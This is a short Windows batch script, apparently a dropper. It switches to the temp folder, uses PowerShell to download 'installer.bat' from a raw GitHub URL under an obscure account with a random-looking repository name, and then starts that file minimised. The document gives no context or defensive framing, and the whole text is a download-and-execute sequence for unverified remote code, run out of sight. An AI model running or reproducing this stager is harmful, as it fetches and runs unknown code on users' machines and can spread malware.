cd %TEMP%
Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/installer.bat' -OutFile installer.bat"
start /min installer.bat
